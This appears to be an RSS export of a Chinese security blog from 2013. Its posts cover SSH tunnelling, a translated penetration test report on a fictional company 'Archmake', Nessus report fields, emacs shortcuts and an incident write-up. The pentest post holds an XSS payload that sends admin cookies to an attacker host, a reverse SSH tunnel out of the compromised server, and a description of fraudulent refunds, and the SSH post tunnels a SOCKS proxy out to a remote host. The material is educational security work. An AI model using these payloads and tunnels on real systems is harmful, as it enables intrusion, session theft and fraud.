&lt;p&gt;姿势：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -fND 127.0.0.1:8080 user@127.0.0.1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样会在本地8080端口开socks5代理，然后反弹&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -fNR 18080:127.0.0.1:8080 forward@123.123.123.123&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样可以把socks5代理弹到123.123.123.123的18080端口，可以用proxychains和其他支持socks5代理的工具最大限度的窥探内网&lt;/p&gt;

&lt;h2 id='id2597'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://drops.wooyun.org/tips/411&lt;/p&gt;

&lt;p&gt;http://www.cyberciti.biz/faq/linux-appleosx-howto-disable-ssh-host-key-checking/&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/16/ssh</link>
                <guid>http://username.github.io/工具使用/2013/09/16/ssh</guid>
                <pubDate>2013-09-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>offensive security pentest report 翻译</title>
                <description>&lt;h2 id='id2590'&gt;摘要&lt;/h2&gt;

&lt;p&gt;Offensive security已经被授权对Archmake的外部网站进行一次渗透测试.测试评估的方式是模拟恶意的攻击者对公司进行目的明确的渗透.主要测试目标包括:&lt;/p&gt;

&lt;p&gt;1, 确认一个远程的攻击者能否穿透Archmake的安全防线.&lt;/p&gt;

&lt;p&gt;2, 评估安全攻击对公司的订单系统,客户的保密信息以及Archmake其他信息系统可能造成的影响.&lt;/p&gt;

&lt;h2 id='id2591'&gt;结果概述&lt;/h2&gt;

&lt;p&gt;在初期的信息搜集阶段,发现Archmake公司仅仅只有一个web网站和一个邮件服务器.可供攻击的目标比较少.&lt;/p&gt;

&lt;p&gt;在对网站的安全评估中,发现它安装了一个有漏洞的WordPress插件.成功利用这个漏洞,取得了WordPress的管理权限.然后反弹了一个交互式的shell并成功提到root权限.&lt;/p&gt;

&lt;p&gt;获取了网站服务器的权限之后,开始对内网进行渗透,经过一番尝试,成功获取到了域管理员的权限.之后对内网进行拓扑分析,发现了内网的公司数据库并成功控制.这个数据库不仅存储了订单信息和客户资料,还保存了交易的相关信息.通过控制这个系统,攻击者可以直接提取现金.&lt;/p&gt;

&lt;h2 id='id2592'&gt;测试过程&lt;/h2&gt;

&lt;h1 id='wordpress'&gt;WordPress漏洞利用&lt;/h1&gt;

&lt;p&gt;在对目标系统进行搜集的时候发现网站采用了wordpress 3.3.1搭建.我们在对WordPress进行代码审计的同时,用WPScan扫描了目标网站,发现一个不安全的插件:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./wpscan.rb --url www.Archmake.com --enumerate p
____________________________________________________
__
_______
_____
\ \
/ / __ \ / ____|
\ \ /\ / /| |__) | (___
___ __ _ _ __
\ \/ \/ / | ___/ \___ \ / __|/ _` | &amp;#39;_ \
\ /\ / | |
____) | (__| (_| | | | |
\/ \/
|_|
|_____/ \___|\__,_|_| |_| v1.1
WordPress Security Scanner by ethicalhack3r.co.uk
Sponsored by the RandomStorm Open Source Initiative
_____________________________________________________
| URL: http://www.Archmake.com/
| Started on Tue Jan 24 18:44:49 2012
[!] The WordPress theme in use is called &amp;quot;twentyeleven&amp;quot;.
[!] The WordPress &amp;quot;http://www.Archmake.com/readme.html&amp;quot; file exists.
[!] WordPress version 3.3.1 identified from meta generator.
[+] Enumerating installed plugins...
Checking for 2892 total plugins... 100% complete.
[+] We found 2 plugins:
Name: relevanssi
Location: http://www.Archmake.com/wp-content/plugins/relevanssi/
Directory listing enabled? Yes.
Name: relevanssi
Location: http://www.Archmake.com/wp-content/plugins/relevanssi/
Directory listing enabled? Yes.
[+] There were 1 vulnerabilities identified from the plugin names:
[!] Relevanssi 2.7.2 Wordpress Plugin Stored XSS Vulnerability
* Reference: http://www.exploit-db.com/exploits/16233/
[+] Finished at Tue Jan 24 18:45:30 2012	  &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;正如WPScan扫描结果展示的一样,这个Relevanssi插件存在一个XSS漏洞.成功利用这个漏洞可以窃取到管理员的cookies.&lt;/p&gt;

&lt;p&gt;第一步,我们在Archmake网站的搜索栏中插入如下代码:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&amp;quot;http://172.16.40.204/p.php?cookie=&amp;quot;+document.cookie; &amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive1.png' /&gt;&lt;/p&gt;

&lt;p&gt;当WordPress管理员点击后台管理面板上的&amp;#8221;User Searches&amp;#8221;时,脚本就会执行.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive2' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive2.png' /&gt;&lt;/p&gt;

&lt;p&gt;远程攻击者的服务器上就可以接收到管理员的cookie.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET
/p.php?cookie=wordpress_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C1328098588
%7C72c3335ad1e783b75bb3d8cf9e85fc9c;%20wp-settings-time-
1=1327925790;%20wordpress_test_cookie=WP+Cookie+check;%20wordpress_logged_i
n_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C1328098588%7Caf1bcabca49191de76e
c45e798ae5ada;%20wp-settings-
1=editor%3Dhtml;%20wordpress_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C13275
99469%7C3ada64cf8e918c9a4bf148896181fc63;%20wordpress_logged_in_ed8a4e5dd81
3c7b5d262130b08955a6a=admin HTTP/1.1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后使用firefox的cookie编辑器,修改cookie.这样就可以绕过WordPress的登录功能,获得一个管理员会话.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive3.png' /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive4.png' /&gt;&lt;/p&gt;

&lt;p&gt;获取到后台管理员权限之后,整站的权限就有很多种方法可以得到了.最直接的就是修改WordPress的主题文件.&lt;/p&gt;

&lt;h1 id='wordpress'&gt;WordPress插件任意文件类型上传&lt;/h1&gt;

&lt;p&gt;取得WordPress系统的权限了,接下来可以白盒审计一下,看看是否有其他的漏洞可能被攻击者利用.这里我们审计了WordPress安装的插件.&lt;/p&gt;

&lt;p&gt;审计插件的时候发现一个可以允许用户上传头像的插件.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive5' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive5.png' /&gt;&lt;/p&gt;

&lt;p&gt;通过对这个插件的源码进行审计,发现它是通过一个正则表达式来控制上传文件的类型的.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive6.png' /&gt;&lt;/p&gt;

&lt;p&gt;上面这段用来检查上传文件的代码是存在缺陷的.这个正则对字符串进行了一次简单的过滤,而且这是唯一的一个检测文件类型的手段.它的本意是只允许像&amp;#8221;Myimage.png&amp;#8221;这样的文件名.但是像&amp;#8221;Myimage.png.php&amp;#8221;这样的文件名也可以成功通过正则的检测,上传到服务器上.&lt;/p&gt;

&lt;p&gt;虽然将后续攻击上传到服务器上有很多方法(前面提到过,比如修改主题).但是我们决定采用这个漏洞来上传.一是可以验证一个新的漏洞,二是这样子对服务器所做的更改最小化.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive7.png' /&gt;&lt;/p&gt;

&lt;p&gt;为了验证这个上传过程确实跟我们分析的一样,先上传了一个标准的图像文件作为测试.然后上传了一个配置好的反弹shell的php脚本.&lt;/p&gt;

&lt;p&gt;执行这个脚本,在攻击者控制的远程服务器上可以获得一个交互式的shell环境.因为这个shell是以webserver的权限的运行的,所以它只有很低的权限.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive8.png' /&gt;&lt;/p&gt;

&lt;h1 id='linux'&gt;Linux本地权限提升&lt;/h1&gt;

&lt;p&gt;获得了目标网站服务器的交互式shell之后,下一个目标自然是获得系统的root权限了.&lt;/p&gt;

&lt;p&gt;目标系统的相关信息如下: Linux version 2.6.32-5-686 (Debian 2.6.32-38) (ben@decadent.org.uk) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Mon Oct 3 04:15:24 UTC 2011&lt;/p&gt;

&lt;p&gt;经过一番资料搜索和测试,发现这个系统存在一个race condition的缺陷.先是通过上传头像的插件上传了利用代码.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive9.png' /&gt;&lt;/p&gt;

&lt;p&gt;解压,加执行权限,执行利用程序,成功获得root权限.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive10.png' /&gt;&lt;/p&gt;

&lt;p&gt;现在,这个网站服务器已经可以作为一个恶意攻击者进行内网渗透的跳板了.如果这是一次真实的攻击,那么这台网站服务器上的任何数据都已经不可信了,因为攻击者可以随意修改控制.&lt;/p&gt;

&lt;h1 id='id2593'&gt;长期驻守服务器&lt;/h1&gt;

&lt;p&gt;获得了服务器的管理权限之后,就需要维护一个更加稳定的连接来进行后续的渗透.&lt;/p&gt;

&lt;p&gt;通过对该服务器的检查,发现它的ssh服务运行在22000端口.我们决定使用ssh将内网端口转发出来.这样子既方便,又不会给服务器带来额外的安全风险.&lt;/p&gt;

&lt;p&gt;为了把对系统的变更降到最低,我们既没有添加账户,也没有修改账户口令.而是采用了SSH 基于密钥的认证方式.&lt;/p&gt;

&lt;p&gt;之前提到过.我们自己控制的SSH服务器,ssh开在53端口.通过执行以下命令,将网站服务器的22000端口转发出来.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -o &amp;#39;StrictHostKeyChecking no&amp;#39; -R 22000:127.0.0.1:22000 -p 53 172.16.40.204 ping 127.0.0.1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive11.png' /&gt;&lt;/p&gt;

&lt;p&gt;此外还需要创建一个SOCKS代理,这样攻击者就可以通过这个代理来访问目标网络里的服务.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive12.png' /&gt;&lt;/p&gt;

&lt;h2 id='splunk'&gt;存在漏洞的splunk&lt;/h2&gt;

&lt;p&gt;当分析已经控制的网站服务器配置的时候发现一个内网网段10.10.0.x.对这个内网网段进行扫描分析,我们发现了一台splunk服务器.&lt;/p&gt;

&lt;p&gt;splunk 低于4.2.5的版本存在一个高危的远程命令执行漏洞.通过前面介绍的SOCKS代理,我们访问到了Splunk的web界面.证实了它的版本是4.2.2&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive13.png' /&gt;&lt;/p&gt;

&lt;p&gt;在windows上splunk一般都是以SYSTEM权限运行的.所以我们可以直接添加一个管理员用户.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive14.png' /&gt;&lt;/p&gt;

&lt;p&gt;这个命令执行漏洞是没有回显的,只能通过登录远程桌面来验证命令是否执行成功.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive15.png' /&gt;&lt;/p&gt;

&lt;p&gt;现在我们又控制了内网一台win服务器.&lt;/p&gt;

&lt;h2 id='id2594'&gt;获得域管理权限&lt;/h2&gt;

&lt;p&gt;内网渗透,而且是windows主机.下一步一般就是要获取域管理员的权限了.我们把WCE(Windows Credential Editor)上传到splunk服务器上.WCE可以从内存中读取认证信息,然后利用这些认证信息来做一些有用的事情.&lt;/p&gt;

&lt;p&gt;在splunk服务器上执行wce.exe,成功从内存中获取到了域管理员的token.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive16.png' /&gt;&lt;/p&gt;

&lt;p&gt;有了这些认证信息,就可以很容易的获取一个域管理员权限的shell.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive17.png' /&gt;&lt;/p&gt;

&lt;p&gt;然后利用这个shell运行终端管理(Microsoft Management Console).攻击者就或得了域的控制权限.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive18.png' /&gt;&lt;/p&gt;

&lt;h2 id='id2595'&gt;数据库数据利用&lt;/h2&gt;

&lt;p&gt;控制splunk服务器之后,在它的本地文件系统中发现了一个csv文件.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive19.png' /&gt;&lt;/p&gt;

&lt;p&gt;分析发现这是一个从数据库中导出的客户信息的文件.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive20.png' /&gt;&lt;/p&gt;

&lt;p&gt;很显然,应该是exportcsv.exe这个程序导出的数据库信息.用OD对这个程序进行了分析,发现它直连了一个MS SQL server.连接的认证信息直接编码在了程序里面.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive21.png' /&gt;&lt;/p&gt;

&lt;p&gt;利用获取到的认证信息可以直连到数据库,从而获得了控制这个数据库所有数据的权限.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive22.png' /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive23.png' /&gt;&lt;/p&gt;

&lt;p&gt;导出数据库的数据进行分析.发现了大量客户的信息,包括用户ID,姓名,邮件,电话,加密的密码和其他信息.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive24.png' /&gt;&lt;/p&gt;

&lt;p&gt;密码是用md5加密的.将这些hash导入我们维护的密码破解器进行破解.一共导入了1000个hash,22秒后,成功破解了996个.(话外音:这是什么节奏啊&amp;#8230;.)&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive25.png' /&gt;&lt;/p&gt;

&lt;h2 id='archmake'&gt;控制Archmake的交易&lt;/h2&gt;

&lt;p&gt;在对数据库进行深入分析的时候我们注意到有很多表的内容会定期更新.通过对这些表的监控和分析发现,原来这是跟订单有关的表.这些订单的信息会定期的更新到数据库里.一段时间以后,会根据&amp;#8221;Category&amp;#8221;字段的不同进行不同的处理.&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive26.png' /&gt;&lt;/p&gt;

&lt;p&gt;经过对数据库监控和在数据库中添加一些测试数据,最后总结除了Categories字段的含义:&lt;/p&gt;

&lt;p&gt;&lt;img alt='offensive6' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/offensive27.png' /&gt;&lt;/p&gt;

&lt;p&gt;交易的类型一确定,相关的信息就会插入到这个表里.我们发现如果插入一个有效的用户ID,用户信息卡信息填攻击者自己控制的信用卡,交易类型选4(4是退款).就可以退任意数额的钱到攻击者的信用卡账户了.这个已经在可控的环境下被证实了.&lt;/p&gt;

&lt;h2 id='id2596'&gt;结论&lt;/h2&gt;</description>
                <link>http://username.github.io/渗透测试/2013/09/13/offensive-security-pentest-report-</link>
                <guid>http://username.github.io/渗透测试/2013/09/13/offensive-security-pentest-report-</guid>
                <pubDate>2013-09-13T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>net snmp 安装配置</title>
                <description>&lt;p&gt;今天调试net-snmp发现几个问题,记录一下:&lt;/p&gt;

&lt;p&gt;默认情况下,样例的配置文件中EXAMPLE.conf里,只可以在本机访问snmp,需要修改配置.但是样例里面删掉注释,无法启动.后来把监听ipv6的端口去掉.只监听ipv4,正常启动.&lt;/p&gt;

&lt;p&gt;想要监控linux的cpu,内存之类的性能.但是获取不到该节点的信息.需要在配置文件中配置对linux私有mib的访问.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;view systemonly include .1.3.6.1.4.1.2021&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;要具体到linux的私有节点 2021&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/13/net-snmp-</link>
                <guid>http://username.github.io/工具使用/2013/09/13/net-snmp-</guid>
                <pubDate>2013-09-13T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>互联网企业自建soc相关资料</title>
                <description>&lt;p&gt;腾讯&lt;a href='http://security.tencent.com/index.php/blog/msg/21'&gt;浅谈大型网络入侵检测建设&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;淘宝 soc 安全运维中心介绍 ppt&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/09/12/soc</link>
                <guid>http://username.github.io/技术研究/2013/09/12/soc</guid>
                <pubDate>2013-09-12T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>emacs速查</title>
                <description>&lt;h2 id='id2588'&gt;替换&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;M-% (然后会出现Query replace的字样)

Query replace:&amp;lt;被替换字符串&amp;gt;

Query replace &amp;lt;被替换字符串&amp;gt; with:&amp;lt;替换字符串&amp;gt;

Query replacing &amp;lt;被替换字符串&amp;gt; with &amp;lt;替换字符串&amp;gt;:（? for help）

查询替换命令的选项如下：

y 或者 空格 键 替换搜索到的字符串

n 或者 Del 键 取消替换搜索到的字符串

^ 回到前一个搜索到的字符串

! 替换所有没有替换的与模式匹配的字符串

ESC 键 退出本次查询搜索&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2589'&gt;复制&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;M+w  复制
C+y  粘贴&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/10/emacs</link>
                <guid>http://username.github.io/工具使用/2013/09/10/emacs</guid>
                <pubDate>2013-09-10T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>nessus扫描报告分析</title>
                <description>&lt;h2 id='id2586'&gt;报告样例&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;ReportItem port=&amp;quot;445&amp;quot; svc_name=&amp;quot;cifs&amp;quot; protocol=&amp;quot;tcp&amp;quot; severity=&amp;quot;4&amp;quot; pluginID=&amp;quot;34477&amp;quot; pluginName=&amp;quot;MS08-067: Microsoft Windows Server Service Crafted RPC Request Handling Remote Code Execution (958644) (uncredentialed check)&amp;quot; pluginFamily=&amp;quot;Windows&amp;quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一条reportitem是一个漏洞.svc_name是端口对应的服务名称.这些属性都比较重要.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;bid&amp;gt;31874&amp;lt;/bid&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;漏洞库bid的id&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;canvas_package&amp;gt;CANVAS&amp;lt;/canvas_package&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;CANVAS Exploit Packs 是一个exp.&lt;a href='http://www.immunityinc.com/canvas-cep.shtml'&gt;canvsa&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;cpe&amp;gt;cpe:/o:microsoft:windows&amp;lt;/cpe&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;cpe是指Common Platform Enumeration (CPE) &lt;a href='http://www.tenable.com/blog/common-platform-enumeration-cpe-with-nessus'&gt;cpe in nessus&lt;/a&gt;.是一种分类标准&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;cve&amp;gt;CVE-2008-4250&amp;lt;/cve&amp;gt;


&amp;lt;cvss_base_score&amp;gt;10.0&amp;lt;/cvss_base_score&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;cvss Common Vulnerability Scoring System (CVSS-SIG) &lt;a href='http://www.first.org/cvss'&gt;cvss&lt;/a&gt; 是对这个漏洞风险的评分,国际标准.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;cvss_temporal_score&amp;gt;8.7&amp;lt;/cvss_temporal_score&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;base score 和temporal score的区别.temporal score是一个随着时间会发生变化的评分.&lt;a href='https://community.qualys.com/thread/9226'&gt;区别&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;cvss_temporal_vector&amp;gt;CVSS2#E:H/RL:OF/RC:C&amp;lt;/cvss_temporal_vector&amp;gt;
&amp;lt;cvss_vector&amp;gt;CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C&amp;lt;/cvss_vector&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;评分详细的标准.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;cwe&amp;gt;94&amp;lt;/cwe&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通用弱点类型.&lt;a href='http://cwe.mitre.org/'&gt;cwe&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;description&amp;gt;The remote host is vulnerable to a buffer overrun in the &amp;#39;Server&amp;#39; service that may allow an attacker to execute arbitrary code on the remote host with the &amp;#39;System&amp;#39; privileges.&amp;lt;/description&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;简要描述漏洞的类型和危害&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;exploit_available&amp;gt;true&amp;lt;/exploit_available&amp;gt;
&amp;lt;exploit_framework_canvas&amp;gt;true&amp;lt;/exploit_framework_canvas&amp;gt; 
&amp;lt;exploit_framework_core&amp;gt;true&amp;lt;/exploit_framework_core&amp;gt; 
&amp;lt;exploit_framework_metasploit&amp;gt;true&amp;lt;/exploit_framework_metasploit&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;是否有公开可用exp&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;exploitability_ease&amp;gt;Exploits are available&amp;lt;/exploitability_ease&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;多个exp可用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;fname&amp;gt;smb_kb958644.nasl&amp;lt;/fname&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所用插件的文件名&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;iava&amp;gt;2008-A-0081&amp;lt;/iava&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;iava &lt;a href='http://en.wikipedia.org/wiki/Information_assurance_vulnerability_alert'&gt;Information assurance vulnerability alert&lt;/a&gt; 可以理解为某种漏洞库的编号&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;metasploit_name&amp;gt;Microsoft Server Service Relative Path Stack Corruption&amp;lt;/metasploit_name&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msf中对该漏洞的命名&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;msft&amp;gt;MS08-067&amp;lt;/msft&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;微软自己对漏洞的编号&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;osvdb&amp;gt;49243&amp;lt;/osvdb&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;osvdb&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;plugin_modification_date&amp;gt;2013/06/03&amp;lt;/plugin_modification_date&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;插件最近修改的时间,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;plugin_name&amp;gt;MS08-067: Microsoft Windows Server Service Crafted RPC Request Handling Remote Code Execution (958644) (uncredentialed check)&amp;lt;/plugin_name&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;插件名称&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;plugin_publication_date&amp;gt;2008/10/23&amp;lt;/plugin_publication_date&amp;gt; 
&amp;lt;plugin_type&amp;gt;local&amp;lt;/plugin_type&amp;gt; 
&amp;lt;risk_factor&amp;gt;Critical&amp;lt;/risk_factor&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;风险等级,更开始的severity是对应的.4是critical&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script_version&amp;gt;$Revision: 1.37 $&amp;lt;/script_version&amp;gt; 
&amp;lt;solution&amp;gt;Microsoft has released a set of patches for Windows 2000, XP, 2003, Vista and 2008 : http://technet.microsoft.com/en-us/security/bulletin/ms08-067&amp;lt;/solution&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;修补该漏洞的方式&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;stig_severity&amp;gt;I&amp;lt;/stig_severity&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;stig Security Technical Implementation Guide &lt;a href='http://en.wikipedia.org/wiki/Security_Technical_Implementation_Guide'&gt;wiki&lt;/a&gt; 也是美国的一个标准.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;synopsis&amp;gt;Arbitrary code can be executed on the remote host due to a flaw in the &amp;#39;Server&amp;#39; service.&amp;lt;/synopsis&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;摘要..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;xref&amp;gt;OSVDB:49243&amp;lt;/xref&amp;gt; 
&amp;lt;xref&amp;gt;MSFT:MS08-067&amp;lt;/xref&amp;gt; 
&amp;lt;xref&amp;gt;IAVA:2008-A-0081&amp;lt;/xref&amp;gt; 
&amp;lt;xref&amp;gt;CWE:94&amp;lt;/xref&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;参考资料. &amp;lt;/ReportItem&amp;gt;&lt;/p&gt;

&lt;h2 id='id2587'&gt;字段详情&lt;/h2&gt;

&lt;p&gt;svc name是端口对应的服务名称&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/06/nessus</link>
                <guid>http://username.github.io/工具使用/2013/09/06/nessus</guid>
                <pubDate>2013-09-06T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>Holiday cracking 翻译</title>
                <description>&lt;p&gt;原文:http://blog.larsstrand.no/2007/04/holiday-cracking.html&lt;/p&gt;

&lt;p&gt;比较老的文章了.国内几个大牛的博客都见到过转载原文的,貌似没见到有翻译版.&lt;/p&gt;

&lt;h2 id='id2585'&gt;翻译&lt;/h2&gt;

&lt;p&gt;最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.&lt;/p&gt;

&lt;p&gt;登上服务器之后随便看了下,最先引起我注意的是&amp;#8221;ls&amp;#8221;命令的输出:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;lars@server1:~$ ls
ls: invalid option -- h
Try `ls --help&amp;#39; for more information.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;为什么&amp;#8221;ls&amp;#8221;默认加了&amp;#8221;-h&amp;#8221;参数呢?我用&amp;#8221;alias&amp;#8221;命令看了一下,然后取消了这个别名之后&amp;#8221;ls&amp;#8221;就工作正常了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;lars@server1:~$ alias ls
alias ls=&amp;#39;ls -sh --color=auto&amp;#39;
lars@server1:~$ unalias ls
lars@server1:~$ ls
backup
lars@server1:~$&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;lars@server1:~$ sudo /etc/init.d/apache2 start
Password:
 * Starting apache 2.0 web server...
(2): apache2: could not open error log file /var/log/apache2/error.log.
Unable to open logs
 ...fail!&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;纳尼?赶紧去&amp;#8221;/var/log/&amp;#8221;目录一看,果然&amp;#8221;apache2/&amp;#8221;文件夹不见了.而且这个目录下其他的文件夹,比如&amp;#8221;mysql/&amp;#8221;,&amp;#8221;samba/&amp;#8221;也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;lars@server1:~$ sudo -i
Password:
root@server1:~# ls
ls: unrecognized prefix: do
ls: unparsable value for LS_COLORS environment variable
total 44
  4 .                 4 .bashrc           4 .ssh
  4 ..                4 .lesshst          8 .viminfo
